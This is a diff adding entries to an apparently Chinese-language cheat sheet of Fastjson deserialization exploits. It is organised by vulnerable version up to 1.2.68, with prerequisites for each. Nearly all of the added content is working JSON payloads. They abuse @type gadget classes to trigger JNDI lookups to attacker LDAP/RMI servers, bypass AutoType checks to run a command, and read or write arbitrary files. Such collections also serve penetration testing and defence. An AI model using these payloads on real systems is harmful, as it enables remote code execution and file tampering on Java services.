@@ -1,5 +1,10 @@
+
 # Fastjson
 Fastjson姿势技巧集合
+
+## 说明
+目前还在整理中，还未排版。
+
 ## 探测
 
 
@@ -424,6 +429,17 @@ poc:
 
 
 
+### Fastjson1.2.5 <= 1.2.59
+
+需要开启AutoType
+
+```java
+{"@type":"com.zaxxer.hikari.HikariConfig","metricRegistry":"ldap://localhost:1389/Exploit"}
+{"@type":"com.zaxxer.hikari.HikariConfig","healthCheckRegistry":"ldap://localhost:1389/Exploit"}
+```
+
+
+
 ### Fastjson1.2.5 <= 1.2.60
 
 **无需开启 autoType：**
@@ -436,12 +452,32 @@ poc:
 
 
 
+### Fastjson1.2.5 <= 1.2.61
+
+```java
+{"@type":"org.apache.commons.proxy.provider.remoting.SessionBeanProvider","jndiName":"ldap://localhost:1389/Exploit","Object":"a"}
+```
+
+
+
+
+
+
+
 ### Fastjson <1.2.62
+
+- 需要开启AutoType；
+- Fastjson <= 1.2.62；
+- JNDI注入利用所受的JDK版本限制；
+- 目标服务端需要存在xbean-reflect包；
 
 
 
 ```java
-{"@type":"org.apache.xbean.propertyeditor.JndiConverter","AsText":"rmi://127.0.0.1:1098/exploit"}"
+{"@type":"org.apache.xbean.propertyeditor.JndiConverter","AsText":"rmi://127.0.0.1:1098/exploit"}
+
+{"@type":"org.apache.cocoon.components.slide.impl.JMSContentInterceptor", "parameters": {"@type":"java.util.Hashtable","java.naming.factory.initial":"com.sun.jndi.rmi.registry.RegistryContextFactory","topic-factory":"ldap://localhost:1389/Exploit"}, "namespace":""}
+
 ```
 
 
@@ -450,10 +486,26 @@ poc:
 
 
 
+### 前提条件
+
+- 开启AutoType；
+- Fastjson <= 1.2.66；
+- JNDI注入利用所受的JDK版本限制；
+- org.apache.shiro.jndi.JndiObjectFactory类需要shiro-core包；
+- br.com.anteros.dbcp.AnterosDBCPConfig类需要Anteros-Core和Anteros-DBCP包；
+- com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig类需要ibatis-sqlmap和jta包；
+
+
+
 ```java
 {"@type":"org.apache.shiro.jndi.JndiObjectFactory","resourceName":"ldap://192.168.80.1:1389/Calc"}
+{"@type":"org.apache.shiro.realm.jndi.JndiRealmFactory", "jndiNames":["ldap://localhost:1389/Exploit"], "Realms":[""]}
+
 
 {"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","metricRegistry":"ldap://192.168.80.1:1389/Calc"}
+
+{"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","healthCheckRegistry":"ldap://localhost:1389/Exploit"}
+
 
 {"@type":"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup","jndiNames":"ldap://192.168.80.1:1389/Calc"}
 
@@ -491,11 +543,93 @@ poc:
 
 
 
-#### 1.2.68 AutoCloseable
+### fastjson<=1.2.67
+
+### 前提条件
+
+- 开启AutoType；
+- Fastjson <= 1.2.67；
+- JNDI注入利用所受的JDK版本限制；
+- org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup类需要ignite-core、ignite-jta和jta依赖；
+- org.apache.shiro.jndi.JndiObjectFactory类需要shiro-core和slf4j-api依赖；
+
+```json
+{"@type":"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup", "jndiNames":["ldap://localhost:1389/Exploit"], "tm": {"$ref":"$.tm"}}
+
+{"@type":"org.apache.shiro.jndi.JndiObjectFactory","resourceName":"ldap://localhost:1389/Exploit","instance":{"$ref":"$.instance"}}
+
+```
+
+
+
+
+
+
+
+### fastjson<=1.2.68 
+
+- Fastjson <= 1.2.68；
+- 利用类必须是expectClass类的子类或实现类，并且不在黑名单中；
+
+
+
+```java
+{"@type":"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig","metricRegistry":"ldap://localhost:1389/Exploit"}
+{"@type":"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig","healthCheckRegistry":"ldap://localhost:1389/Exploit"}
+{"@type":"com.caucho.config.types.ResourceRef","lookupName": "ldap://localhost:1389/Exploit", "value": {"$ref":"$.value"}}
+
+```
+
+
+
+无需开启AutoType，直接成功绕过CheckAutoType()的检测从而触发执行：
+
+```json
+{"@type":"java.lang.AutoCloseable","@type":"vul.VulAutoCloseable","cmd":"calc"}
+```
+
+
+
+读文件
+
+```json
+{"@type":"java.lang.AutoCloseable", "@type":"org.eclipse.core.internal.localstore.SafeFileOutputStream", "tempPath":"C:/Windows/win.ini", "targetPath":"D:/wamp64/www/win.txt"}
+```
+
+
 
 写文件
 
+```json
+{
+    "stream": {
+        "@type": "java.lang.AutoCloseable",
+        "@type": "org.eclipse.core.internal.localstore.SafeFileOutputStream",
+        "targetPath": "D:/wamp64/www/hacked.txt",
+        "tempPath": "D:/wamp64/www/test.txt"
+    },
+    "writer": {
+        "@type": "java.lang.AutoCloseable",
+        "@type": "com.esotericsoftware.kryo.io.Output",
+        "buffer": "cHduZWQ=",
+        "outputStream": {
+            "$ref": "$.stream"
+        },
+        "position": 5
+    },
+    "close": {
+        "@type": "java.lang.AutoCloseable",
+        "@type": "com.sleepycat.bind.serial.SerialOutput",
+        "out": {
+            "$ref": "$.writer"
+        }
+    }
+}
+```
 
+
+
+写文件
 
 ```java
 {
@@ -555,6 +689,18 @@ poc:
     'protocolVersion':1
 }
 ```
+
+
+
+### fastjson未知版本
+
+```java
+{"@type":"org.apache.aries.transaction.jms.RecoverablePooledConnectionFactory", "tmJndiName": "ldap://localhost:1389/Exploit", "tmFromJndi": true, "transactionManager": {"$ref":"$.transactionManager"}}
+
+{"@type":"org.apache.aries.transaction.jms.internal.XaPooledConnectionFactory", "tmJndiName": "ldap://localhost:1389/Exploit", "tmFromJndi": true, "transactionManager": {"$ref":"$.transactionManager"}}
+```
+
+ 
 
 
 
